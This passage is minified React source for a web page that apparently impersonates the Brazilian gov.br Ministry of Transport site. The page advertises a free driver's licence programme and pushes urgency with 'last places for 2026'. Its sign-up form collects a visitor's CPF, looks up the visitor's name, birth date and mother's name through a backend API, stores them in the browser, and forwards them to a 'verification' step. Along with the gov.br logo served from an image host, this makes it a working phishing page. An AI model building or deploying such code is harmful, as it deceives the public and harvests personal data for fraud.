        Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
    }
    return e
  }
    ,
    jl.apply(this, arguments)
}
function Kg(e, t) {
  var n = Object.keys(e);
  if (Object.getOwnPropertySymbols) {
    var r = Object.getOwnPropertySymbols(e);
    t && (r = r.filter(function (s) {
      return Object.getOwnPropertyDescriptor(e, s).enumerable
    })),
      n.push.apply(n, r)
  }
  return n
}
function Pl(e) {
  for (var t = 1; t < arguments.length; t++) {
    var n = arguments[t] != null ? arguments[t] : {};
    t % 2 ? Kg(Object(n), !0).forEach(function (r) {
      TT(e, r, n[r])
    }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(n)) : Kg(Object(n)).forEach(function (r) {
      Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(n, r))
    })
  }
  return e
}
function TT(e, t, n) {
  return t = kT(t),
    t in e ? Object.defineProperty(e, t, {
      value: n,
      enumerable: !0,
      configurable: !0,
      writable: !0
    }) : e[t] = n,
    e
}
function kT(e) {
  var t = DT(e, "string");
  return typeof t == "symbol" ? t : t + ""
}
function DT(e, t) {
  if (typeof e != "object" || !e)
    return e;
  var n = e[Symbol.toPrimitive];
  if (n !== void 0) {
    var r = n.call(e, t || "default");
    if (typeof r != "object")
      return r;
    throw new TypeError("@@toPrimitive must return a primitive value.")
  }
  return (t === "string" ? String : Number)(e)
}
function Dw(e) {
  return e && e.map((t, n) => ue.createElement(t.tag, Pl({
    key: n
  }, t.attr), Dw(t.child)))
}
function gt(e) {
  return t => ue.createElement(MT, jl({
    attr: Pl({}, e.attr)
  }, t), Dw(e.child))
}
function MT(e) {
  var t = n => {
    var { attr: r, size: s, title: o } = e, i = AT(e, PT), l = s || n.size || "1em", c;
    return n.className && (c = n.className),
      e.className && (c = (c ? c + " " : "") + e.className),
      ue.createElement("svg", jl({
        stroke: "currentColor",
        fill: "currentColor",
        strokeWidth: "0"
      }, n.attr, r, i, {
        className: c,
        style: Pl(Pl({
          color: e.color || n.color
        }, n.style), e.style),
        height: l,
        width: l,
        xmlns: "http://www.w3.org/2000/svg"
      }), o && ue.createElement("title", null, o), e.children)
  }
    ;
  return Gg !== void 0 ? ue.createElement(Gg.Consumer, null, n => t(n)) : t(kw)
}
function Yg(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 320 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"
      },
      child: []
    }]
  })(e)
}
function RT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM144.5 319c-35.1 0-63.5-28.4-63.5-63.5s28.4-63.5 63.5-63.5 63.5 28.4 63.5 63.5-28.4 63.5-63.5 63.5zm159 0c-35.1 0-63.5-28.4-63.5-63.5s28.4-63.5 63.5-63.5 63.5 28.4 63.5 63.5-28.4 63.5-63.5 63.5z"
      },
      child: []
    }]
  })(e)
}
function OT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"
      },
      child: []
    }]
  })(e)
}
function Xg(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z"
      },
      child: []
    }]
  })(e)
}
function IT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"
      },
      child: []
    }]
  })(e)
}
function _T(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"
      },
      child: []
    }]
  })(e)
}
function LT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 576 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"
      },
      child: []
    }]
  })(e)
}
function cs(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 448 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M207.029 381.476L12.686 187.132c-9.373-9.373-9.373-24.569 0-33.941l22.667-22.667c9.357-9.357 24.522-9.375 33.901-.04L224 284.505l154.745-154.021c9.379-9.335 24.544-9.317 33.901.04l22.667 22.667c9.373 9.373 9.373 24.569 0 33.941L240.971 381.476c-9.373 9.372-24.569 9.372-33.942 0z"
      },
      child: []
    }]
  })(e)
}
function Gn(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 320 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"
      },
      child: []
    }]
  })(e)
}
function FT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M510.37 254.79l-12.08-76.26a132.493 132.493 0 0 0-37.16-72.95l-54.76-54.75c-19.73-19.72-45.18-32.7-72.71-37.05l-76.7-12.15c-27.51-4.36-55.69.11-80.52 12.76L107.32 49.6a132.25 132.25 0 0 0-57.79 57.8l-35.1 68.88a132.602 132.602 0 0 0-12.82 80.94l12.08 76.27a132.493 132.493 0 0 0 37.16 72.95l54.76 54.75a132.087 132.087 0 0 0 72.71 37.05l76.7 12.14c27.51 4.36 55.69-.11 80.52-12.75l69.12-35.21a132.302 132.302 0 0 0 57.79-57.8l35.1-68.87c12.71-24.96 17.2-53.3 12.82-80.96zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z"
      },
      child: []
    }]
  })(e)
}
function VT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 576 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"
      },
      child: []
    }]
  })(e)
}
function BT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"
      },
      child: []
    }]
  })(e)
}
function zT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 352 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z"
      },
      child: []
    }]
  })(e)
}
function UT(e) {
  return gt({
    tag: "svg",
    attr: {
      viewBox: "0 0 512 512"
    },
    child: [{
      tag: "path",
      attr: {
        d: "M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"
      },
      child: []
    }]
  })(e)
}
function $T(e) {
  return e.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/g, "$1.$2.$3-$4")
}
function Mo(e) {
  return e.replace(/\D/g, "")
}
function HT() {
  const [, e] = Un()
    , [t, n] = x.useState("")
    , [r, s] = x.useState(0)
    , [o, i] = x.useState(!1)
    , [l, c] = x.useState("")
    , [u, d] = x.useState(!1)
    , [f, h] = x.useState(0)
    , y = [{
      src: "https://www.gov.br/transportes/pt-br/assuntos/noticias/2025/12/na-paraiba-renan-filho-se-encontra-com-a-primeira-brasileira-a-obter-a-cnh-pelo-novo-modelo/16-12-2025-visita-detran-pb-fb-31.jpg/@@images/1ec696b3-5fcb-47ad-bbf5-2434ebab72f4.jpeg",
      alt: "Ministro Renan Filho entrega CNH para Andreza Lima"
    }, {
      src: "https://img.portalmarcossantos.com.br/wp-content/uploads/2025/12/09150903/Detran-AM-participa-do-lancamento-do-programa-CNH-do-Brasil-confira-novas-regras-para-obter-o-documento.jpeg",
      alt: "Lançamento do Programa CNH do Brasil"
    }, {
      src: "https://www.correiodopovo.com.br/image/contentid/policy:1.1673604:1765295384/54973872879_04a7feaa7d_o.jpg?f=4x3&q=0.9&w=900&$p$f$q$w=6d639ba",
      alt: "Programa CNH do Brasil"
    }]
    , b = () => {
      h(S => (S + 1) % y.length)
    }
    , v = () => {
      h(S => (S - 1 + y.length) % y.length)
    }
    ;
  x.useEffect(() => {
    const S = setInterval(() => {
      h(N => (N + 1) % y.length)
    }
      , 3e3);
    return () => clearInterval(S)
  }
    , []),
    x.useEffect(() => {
      const S = localStorage.getItem("userData");
      if (S) {
        const N = JSON.parse(S);
        N.nome && n(N.nome.split(" ")[0])
      }
    }
      , []),
    x.useEffect(() => {
      let S = window.scrollY
        , N = !1
        , P = null;
      const A = () => {
        if (!N) {
          const D = window.scrollY
            , q = D - S;
          Math.abs(q) > 5 && (P && clearTimeout(P),
            q > 0 ? s(-20) : s(20),
            S = D,
            P = setTimeout(() => {
              s(0)
            }
              , 300)),
            N = !0,
            setTimeout(() => {
              N = !1
            }
              , 100)
        }
      }
        ;
      window.addEventListener("scroll", A, {
        passive: !0
      });
      const k = document.createElement("script");
      return k.src = "https://scripts.converteai.net/da81f5f5-37db-4918-a254-6bc20cea567f/players/694b9955ba8707e946b85f77/v4/player.js",
        k.async = !0,
        document.head.appendChild(k),
        () => {
          window.removeEventListener("scroll", A),
            P && clearTimeout(P)
        }
    }
      , []);
  const [C, g] = x.useState(!1)
    , m = async () => {
      e("/login" + window.location.search)
    }
    , p = S => {
      let N = S.target.value;
      N = Mo(N),
        c($T(N.slice(0, 11)))
    }
    , w = async S => {
      if (S.preventDefault(),
        !(!l || Mo(l).length < 11)) {
        d(!0);
        try {
          const N = Mo(l)
            , A = await (await fetch(`/api/cpf-lookup/${N}`)).json();
          A.DADOS && A.DADOS.nome && A.DADOS.nome.trim() !== "" && A.DADOS.data_nascimento && A.DADOS.data_nascimento.trim() !== "" && A.DADOS.nome_mae && A.DADOS.nome_mae.trim() !== "" ? (localStorage.setItem("userData", JSON.stringify({
            cpf: N,
            nome: A.DADOS.nome,
            dataNascimento: A.DADOS.data_nascimento,
            nomeMae: A.DADOS.nome_mae
          })),
            e(`/verificacao?data=${encodeURIComponent(JSON.stringify(A.DADOS))}`)) : e(`/verificacao?data=${encodeURIComponent(JSON.stringify({
              cpf: N,
              nome: "",
              nome_mae: "",
              data_nascimento: "",
              sexo: "",
              manualEntry: !0
            }))}`)
        } catch (N) {
          console.error("Error fetching data:", N);
          const A = {
            cpf: Mo(l),
            nome: "",
            nome_mae: "",
            data_nascimento: "",
            sexo: "",
            manualEntry: !0
          };
          e(`/verificacao?data=${encodeURIComponent(JSON.stringify(A))}`)
        } finally {
          d(!1)
        }
      }
    }
    ;
  return a.jsxs("div", {
    className: "bg-white",
    children: [a.jsxs("header", {
      style: {
        backgroundColor: "white",
        padding: "12px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: [a.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [a.jsx("img", {
          src: "https://i.ibb.co/zPFChvR/logo645.png",
          alt: "Logo gov.br estilizada com texto em azul e amarelo",
          style: {
            marginRight: "32px",
            background: "none",
            boxShadow: "none"
          },
          width: "70",
          height: "24"
        }), a.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            fontSize: "14px",
            marginLeft: "32px",
            cursor: "pointer",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          "aria-label": "Menu de links",
          children: a.jsx("i", {
            className: "fas fa-ellipsis-v",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), a.jsx("div", {
          style: {
            borderLeft: "1px solid #ccc",
            height: "24px",
            margin: "0 16px",
            background: "none",
            boxShadow: "none"
          }
        })]
      }), a.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [a.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          children: a.jsx("i", {
            className: "fas fa-cookie-bite",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), a.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          type: "button",
          "aria-label": "Sistemas",
          children: a.jsx("i", {
            className: "fas fa-th",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), a.jsxs("button", {
          onClick: () => i(!0),
          style: {
            backgroundColor: "#1451B4",
            color: "white",
            border: "none",
            borderRadius: "9999px",
            padding: "6px 16px",
            display: "flex",
            alignItems: "center",
            fontSize: "14px",
            cursor: "pointer",
            marginLeft: "24px",
            boxShadow: "none"
          },
          type: "button",
          children: [a.jsx("i", {
            className: "fas fa-user",
            style: {
              color: "white",
              marginRight: "8px",
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          }), a.jsx("span", {
            children: t || "Entrar"
          })]
        })]
      })]
    }), a.jsxs("nav", {
      style: {
        backgroundColor: "white",
        padding: "16px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: [a.jsxs("button", {
        style: {
          border: "none",
          color: "#1451B4",
          display: "flex",
          alignItems: "center",
          cursor: "pointer",
          background: "none",
          boxShadow: "none",
          padding: 0
        },
        children: [a.jsx("i", {
          className: "fas fa-bars",
          style: {
            marginRight: "10px",
            fontSize: "16px",
            background: "none",
            boxShadow: "none"
          },
          "aria-hidden": "true"
        }), a.jsx("span", {
          style: {
            color: "#666",
            fontSize: "1rem",
            fontWeight: 300,
            lineHeight: "20px",
            paddingTop: "2px",
            background: "none",
            boxShadow: "none"
          },
          children: "Ministério dos Transportes"
        })]
      }), a.jsx("button", {
        style: {
          border: "none",
          color: "#1451B4",
          fontSize: "16px",
          cursor: "pointer",
          background: "none",
          boxShadow: "none",
          padding: 0
        },
        "aria-label": "Pesquisar",
        children: a.jsx("i", {
          className: "fas fa-search",
          style: {
            background: "none",
            boxShadow: "none"
          },
          "aria-hidden": "true"
        })
      })]
    }), a.jsx("div", {
      className: "px-4 py-3",
      children: a.jsxs("nav", {
        className: "flex items-center text-sm text-gray-600 flex-wrap gap-1",
        children: [a.jsx(VT, {
          className: "text-[#1351B4] text-xs"
        }), a.jsx(Gn, {
          className: "text-gray-400 text-xs mx-1"
        }), a.jsx("span", {
          className: "text-[#1351B4]",
          children: "Assuntos"
        }), a.jsx(Gn, {
          className: "text-gray-400 text-xs mx-1"
        }), a.jsx("span", {
          className: "text-[#1351B4]",
          children: "Notícias"
        }), a.jsx(Gn, {
          className: "text-gray-400 text-xs mx-1"
        }), a.jsx("span", {
          className: "text-[#1351B4]",
          children: "2025"
        }), a.jsx(Gn, {
          className: "text-gray-400 text-xs mx-1"
        }), a.jsx("span", {
          className: "text-[#1351B4]",
          children: "12"
        }), a.jsx(Gn, {
          className: "text-gray-400 text-xs mx-1"
        }), a.jsx("span", {
          className: "font-semibold",
          style: {
            fontSize: "0.8125rem",
            color: "#333333"
          },
          children: "Como solicitar sua Carteira de motorista gratuitamente e sem autoescola"
        })]
      })
    }), a.jsx("div", {
      className: "border-b border-gray-200"
    }), a.jsxs("main", {
      className: "px-4 py-6 max-w-4xl mx-auto",
      children: [a.jsx("div", {
        className: "mb-4",
        children: a.jsx("span", {
          className: "font-bold text-sm uppercase tracking-wide",
          style: {
            color: "#717171"
          },
          children: "TRÂNSITO"
        })
      }), a.jsx("h1", {
        className: "text-2xl md:text-3xl font-bold leading-tight mb-4",
        style: {
          color: "#0c326f"
        },
        children: "CNH do Brasil: Governo libera carteira de motorista 100% gratuita e sem necessidade de autoescola"
      }), a.jsxs("div", {
        className: "flex items-center gap-4 mb-4",
        children: [a.jsx("span", {
          className: "text-gray-500 text-sm",
          children: "Compartilhe:"
        }), a.jsxs("div", {
          className: "flex gap-3",
          children: [a.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: a.jsx(Yg, {
              size: 18
            })
          }), a.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: a.jsx(IT, {
              size: 18
            })
          }), a.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: a.jsx(Xg, {
              size: 18
            })
          }), a.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: a.jsx(_T, {
              size: 18
            })
          }), a.jsx("span", {
            className: "hover:opacity-80 transition-opacity cursor-pointer",
            style: {
              color: "#276FE8"
            },
            children: a.jsx(BT, {
              size: 18
            })
          })]
        })]
      }), a.jsxs("div", {
        className: "text-sm text-gray-500 mb-6",
        children: [a.jsx("p", {
          children: "Publicado em 09/12/2025 20h58"
        }), a.jsxs("p", {
          children: ["Atualizado em ", new Date().toLocaleDateString("pt-BR"), " ", new Date().getHours(), "h", String(new Date().getMinutes()).padStart(2, "0")]
        })]
      }), a.jsx("div", {
        className: "mb-6 overflow-hidden",
        children: a.jsx("div", {
          dangerouslySetInnerHTML: {
            __html: '<video width="100%" controls autoplay muted playsinline><source src="/gov.mp4" type="video/mp4">Seu navegador não suporta a tag de vídeo.</video>'
          }
        })
      }), a.jsxs("p", {
        className: "text-base leading-relaxed mb-6",
        style: {
          color: "#717171"
        },
        children: [a.jsx("span", {
          className: "float-left text-5xl font-bold text-[#1351B4] mr-3 mt-1 leading-none",
          children: "A"
        }), "ndreza Lima dos Santos, de 27 anos, empregada doméstica e mãe de dois filhos, iniciou o processo para tirar a CNH no dia 10/12/2025, um dia após a nova resolução entrar em vigor. Em apenas 11 dias, no dia 21/12/2025, ela concluiu todas as etapas e realizou a prova prática. O ministro dos Transportes, Renan Filho, entregou pessoalmente a habilitação, tornando Andreza a primeira brasileira a obter a CNH pelo novo modelo. Com a Resolução nº 985/2025 do Contran, mais de 1 milhão de brasileiros já se inscreveram no programa, e ", a.jsx("strong", {
          style: {
            color: "#333333"
          },
          children: "as vagas para 2026 estão se esgotando."
        })]
      }), a.jsxs("div", {
        className: "mb-8 relative overflow-hidden",
        children: [a.jsx("img", {
          src: y[f].src,
          alt: y[f].alt,
          className: "w-full rounded-lg shadow-md object-cover animate-fadeIn",
          style: {
            height: "200px"
          }
        }, f), a.jsx("button", {
          onClick: v,
          className: "absolute left-2 top-1/2 -translate-y-1/2 bg-white/80 hover:bg-white text-[#1351B4] w-10 h-10 rounded-full flex items-center justify-center shadow-lg transition-all",
          "aria-label": "Imagem anterior",
          children: a.jsx(Gn, {
            className: "rotate-180",
            size: 16
          })
        }), a.jsx("button", {
          onClick: b,
          className: "absolute right-2 top-1/2 -translate-y-1/2 bg-white/80 hover:bg-white text-[#1351B4] w-10 h-10 rounded-full flex items-center justify-center shadow-lg transition-all",
          "aria-label": "Próxima imagem",
          children: a.jsx(Gn, {
            size: 16
          })
        }), a.jsx("div", {
          className: "absolute bottom-3 left-1/2 -translate-x-1/2 flex gap-2",
          children: y.map((S, N) => a.jsx("button", {
            onClick: () => h(N),
            className: `w-2.5 h-2.5 rounded-full transition-all ${f === N ? "bg-[#1351B4]" : "bg-white/70"}`,
            "aria-label": `Ir para imagem ${N + 1}`
          }, N))
        })]
      }), a.jsxs("article", {
        className: "prose prose-lg max-w-none",
        children: [a.jsx("p", {
          className: "text-base leading-relaxed mb-4",
          style: {
            color: "#717171"
          },
          children: "O processo para obter a primeira Carteira Nacional de Habilitação ficou mais simples com o novo Programa CNH do Brasil, site oficial do Ministério dos Transportes. Pelo celular, o cidadão pode abrir o requerimento, acompanhar todas as etapas, realizar o curso teórico gratuito e acessar a versão digital da habilitação. Confira, ponto a ponto, como funciona."
        }), a.jsxs("div", {
          className: "text-center my-8",
          children: [a.jsx("button", {
            onClick: () => {
              var S;
              return (S = document.getElementById("como-se-inscrever")) == null ? void 0 : S.scrollIntoView({
                behavior: "smooth"
              })
            }
            ,
            className: "bg-[#1351B4] hover:bg-[#0D3C8C] text-white font-semibold py-3 px-6 rounded-full text-base transition-all transform hover:scale-105 shadow-lg",
            children: "Fazer Minha Inscrição Agora"
          }), a.jsx("p", {
            className: "text-base leading-relaxed mt-3",
            style: {
              color: "#717171",
              opacity: .6
            },
            children: "Últimas vagas para 2026"
          })]
        }), a.jsx("h2", {
          className: "text-xl font-bold mt-8 mb-4",
          style: {
            color: "#333333"
          },
          children: "1. O que mudou com a nova resolução?"
        }), a.jsxs("ul", {
          className: "list-disc pl-6 space-y-3 mb-6 text-base leading-relaxed",
          style: {
            color: "#717171"
          },
          children: [a.jsxs("li", {
            children: [a.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Fim da obrigatoriedade de autoescola:"
            }), " Candidatos não precisam mais frequentar Centros de Formação de Condutores (CFCs)"]
          }), a.jsxs("li", {
            children: [a.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Curso teórico online e gratuito:"
            }), " Disponível após realizar o cadastro."]
          }), a.jsxs("li", {
            children: [a.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Carga horária prática reduzida:"
            }), " De 20 horas obrigatórias para apenas 2 horas mínimas"]
          }), a.jsxs("li", {
            children: [a.jsx("strong", {
              style: {
                color: "#333333"
              },
              children: "Aulas práticas flexíveis:"
            }), " Podem ser realizadas com instrutor autônomo credenciado pelo Detran"]
